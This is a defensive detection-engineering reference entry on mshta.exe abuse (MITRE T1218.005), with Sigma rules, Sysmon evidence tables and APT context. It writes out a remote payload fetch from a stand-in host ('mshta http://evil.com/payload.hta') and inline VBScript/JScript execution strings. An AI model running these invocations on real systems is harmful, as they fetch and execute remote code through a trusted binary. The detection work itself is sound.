---
id: ADE2-006
title: Mshta Execution
ade_category: ADE2
ade_subcategory: ADE2-01
mitre_attack:
  - T1218.005 (System Binary Proxy Execution: Mshta)
platform: Windows
testable: true
---

# Mshta Execution

## Summary

Mshta.exe executes HTML Application (HTA) files and can run inline VBScript or JScript without touching disk. It serves as an alternative script execution engine to cscript/wscript, and can fetch and execute remote HTA payloads over HTTP/HTTPS. Unlike most LOLBins, inline mshta payloads expose the entire payload in the Sysmon CommandLine field — meaning command-line inspection actually works, but rules must specifically target mshta's unique invocation patterns. Mshta is technically an Internet Explorer component (`ProductName: "Microsoft(R) HTML Application Host"`) that persists even after IE's removal.

## ADE Classification

**Category:** ADE2 — Omit Alternatives
**Subcategory:** ADE2-02 — Alternative Code Execution
**Core principle:** Rules monitoring PowerShell and cmd.exe for script execution miss mshta, which provides VBScript and JScript execution through a signed Microsoft binary that is part of the Internet Explorer component stack.

## The Technique

Mshta.exe is the Microsoft HTML Application Host. It processes HTA files — HTML documents with elevated privileges that can run ActiveX controls, VBScript, and JScript outside the browser sandbox.

### Execution modes

**1. Remote HTA execution:**

```cmd
mshta http://evil.com/payload.hta
```

Mshta fetches the HTA file over HTTP/HTTPS and executes its embedded scripts. The HTA file can contain full VBScript or JScript payloads.

**2. Inline VBScript:**

```cmd
mshta vbscript:Execute("MsgBox ""test"":close")
```

Executes VBScript directly from the command line. The `close` at the end prevents the HTA window from persisting.

**3. Inline JScript:**

```cmd
mshta javascript:alert('test');close();
```

Same mechanism, different scripting language.

**4. About protocol:**

```cmd
mshta "about:<script language='VBScript'>MsgBox ""test"":close</script>"
```

Uses the `about:` protocol to embed script content directly.

### Why inline execution is detectable

Unlike MSBuild (where the payload is in a file, not the command line), inline mshta payloads place the entire script in the command line. This means:

- Sysmon EID 1 `CommandLine` contains the full payload
- Rules CAN detect via command-line inspection — but must match mshta-specific patterns
- The evasion is against rules that only monitor cscript/wscript/powershell, not against command-line analysis in general

### Why remote execution is harder to detect

With `mshta http://evil.com/payload.hta`, the command line shows only the URL. The payload content is not in any process creation event — it is fetched at runtime and executed in-memory.

**OriginalFileName:** `MSHTA.EXE` (Sysmon strips the `.MUI` suffix — see NUANCES #4)

**ProductName:** `Microsoft (R) HTML Application Host` — mshta is part of the Internet Explorer component stack. Its `ProductName` in the PE resources is `"Internet Explorer"` on older builds, making it detectable via product metadata even if renamed.

## Bypass Demonstration

### Benign test payload

```cmd
:: Inline VBScript — shows a message box
mshta vbscript:Execute("MsgBox ""Benign mshta test"":close")

:: Inline JScript — writes a temp file
mshta javascript:var%20fso=new%20ActiveXObject('Scripting.FileSystemObject');var%20f=fso.CreateTextFile('C:\\Users\\Public\\mshta_test.txt',true);f.WriteLine('test');f.Close();close();
type C:\Users\Public\mshta_test.txt
del C:\Users\Public\mshta_test.txt
```

### What the parser sees vs. what the rule sees

| Layer | Sees |
|-------|------|
| Sysmon EID 1 (inline VBScript) | `mshta vbscript:Execute("MsgBox ""Benign mshta test"":close")` — full payload visible |
| Sysmon EID 1 (remote HTA) | `mshta http://evil.com/payload.hta` — only URL, not payload |
| Sysmon EID 3 (NetworkConnect) | `mshta.exe` connecting to the HTA host |
| Sysmon EID 1 (child process) | Whatever the HTA launches, with ParentImage = mshta.exe |
| Script Block Logging (4104) | N/A unless HTA launches PowerShell |
| AMSI | VBScript/JScript content may be intercepted on Windows 10+ |

## Vulnerable Rule

```yaml
title: VBScript Execution
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\cscript.exe'
            - '\wscript.exe'
    selection_vbs:
        CommandLine|contains: '.vbs'
    condition: selection and selection_vbs
```

### Why it misses

The rule only monitors cscript.exe and wscript.exe for VBScript execution. Mshta.exe provides an entirely separate VBScript execution engine. Inline mshta does not reference `.vbs` files at all — the script is in the command line.

## Hardened Rule

```yaml
title: Mshta Inline Script Execution (Hardened)
status: experimental
description: |
    Detects mshta.exe executing inline VBScript or JScript via the
    vbscript:, javascript:, or about: protocol handlers. The entire
    payload is visible in the command line.
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\mshta.exe'
        - OriginalFileName: 'MSHTA.EXE'
    selection_inline:
        CommandLine|contains:
            - 'vbscript:'
            - 'javascript:'
            - 'about:<'
    condition: selection_img and selection_inline
falsepositives:
    - None expected — inline script execution via mshta has no legitimate use case
level: critical
---
title: Mshta Remote HTA Execution (Hardened)
status: experimental
description: |
    Detects mshta.exe fetching and executing a remote HTA file.
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\mshta.exe'
        - OriginalFileName: 'MSHTA.EXE'
    selection_remote:
        CommandLine|contains:
            - 'http://'
            - 'https://'
            - 'ftp://'
            - '\\\\'
    condition: selection_img and selection_remote
falsepositives:
    - Legitimate HTA applications hosted on intranet (rare in modern environments)
level: high
---
title: Mshta Spawning Suspicious Child Process (Hardened)
status: experimental
description: |
    Detects mshta.exe spawning shells, script interpreters, or other
    execution proxies. This catches both inline and file-based HTA
    payloads that launch secondary processes.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\mshta.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cscript.exe'
            - '\wscript.exe'
            - '\regsvr32.exe'
            - '\rundll32.exe'
            - '\certutil.exe'
            - '\bitsadmin.exe'
    condition: selection
falsepositives:
    - Legacy HTA-based enterprise applications (becoming rare)
level: high
---
title: Mshta Network Connection (Hardened)
status: experimental
description: |
    Detects mshta.exe initiating any outbound network connection.
    Legitimate HTA applications are almost exclusively local.
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        Image|endswith: '\mshta.exe'
        Initiated: 'true'
    condition: selection
falsepositives:
    - Intranet HTA applications that fetch resources
level: high
```

## Sysmon Evidence

### Event ID 1 -- Process Create (mshta inline VBScript)

| Field | Value | Note |
|-------|-------|------|
| Image | `C:\Windows\System32\mshta.exe` | Signed Microsoft binary |
| CommandLine | `mshta vbscript:Execute("MsgBox ""Benign mshta test"":close")` | Full payload in command line |
| OriginalFileName | `MSHTA.EXE` | Sysmon strips `.MUI` suffix |
| ParentImage | `C:\Windows\System32\cmd.exe` | Parent process |

### Event ID 1 -- Process Create (mshta remote HTA)

| Field | Value | Note |
|-------|-------|------|
| Image | `C:\Windows\System32\mshta.exe` | Same binary |
| CommandLine | `mshta http://evil.com/payload.hta` | Only URL visible, not payload content |
| OriginalFileName | `MSHTA.EXE` | PE header value |

### Event ID 3 -- Network Connect (remote HTA)

| Field | Value | Note |
|-------|-------|------|
| Image | `C:\Windows\System32\mshta.exe` | Mshta makes the connection directly |
| DestinationHostname | `evil.com` | Remote HTA host |
| DestinationPort | `80` or `443` | HTTP or HTTPS |
| Initiated | `true` | Outbound connection |

### Event ID 1 -- Child Process (spawned by HTA)

| Field | Value | Note |
|-------|-------|------|
| Image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | Example child |
| ParentImage | `C:\Windows\System32\mshta.exe` | mshta as parent is the signal |
| ParentCommandLine | `mshta http://evil.com/payload.hta` | Full parent context |

## Detection Layers

| Layer | Detects? | Why |
|-------|----------|-----|
| cscript/wscript Image detection | No | Script runs inside mshta, not WSH |
| mshta Image/OriginalFileName | Yes | Identifies mshta execution regardless of arguments |
| Command-line protocol handler | Yes | `vbscript:`, `javascript:`, `about:` patterns are high-fidelity |
| Command-line URL detection | Yes | Catches remote HTA fetching |
| Network connection from mshta | Yes | mshta connecting out is almost always malicious |
| Child process monitoring | Yes | mshta spawning shells/interpreters is suspicious |
| Script Block Logging (4104) | Partial | Only if HTA launches PowerShell |
| AMSI | Partial | Windows 10+ may intercept VBScript/JScript content |

## Known APT Usage

| Threat Actor | Context |
|-------------|---------|
| APT29 (Cozy Bear) | Used mshta for initial code execution in diplomatic espionage campaigns |
| FIN7 (Carbanak) | Employed mshta with inline VBScript in spear-phishing attacks against hospitality and retail |
| Lazarus Group | Incorporated mshta HTA execution in multi-stage attack chains targeting cryptocurrency firms |
| Gamaredon (Primitive Bear) | Used mshta extensively for VBScript execution in Ukraine-focused operations |

## Implementation Nuances

- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #4: Sysmon strips `.MUI` suffix — OriginalFileName shows `MSHTA.EXE`, not `MSHTA.EXE.MUI`
- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #2: Sysmon CommandLine is raw — for inline mshta, this is actually beneficial because the full payload is captured verbatim
- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #11: OriginalFileName survives binary copy/rename — catches renamed mshta copies
- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #5: Sigma `|re` regex varies by backend — if using regex to parse inline script content, test across SIEM targets

## References

- [LOLBAS - Mshta.exe](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
- [MITRE ATT&CK T1218.005 - Mshta](https://attack.mitre.org/techniques/T1218/005/)
- [Atomic Red Team - T1218.005](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md)
- [Red Canary - Mshta Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/mshta/)
- [Microsoft - HTML Applications (HTAs)](https://learn.microsoft.com/en-us/previous-versions/ms536496(v=vs.85))
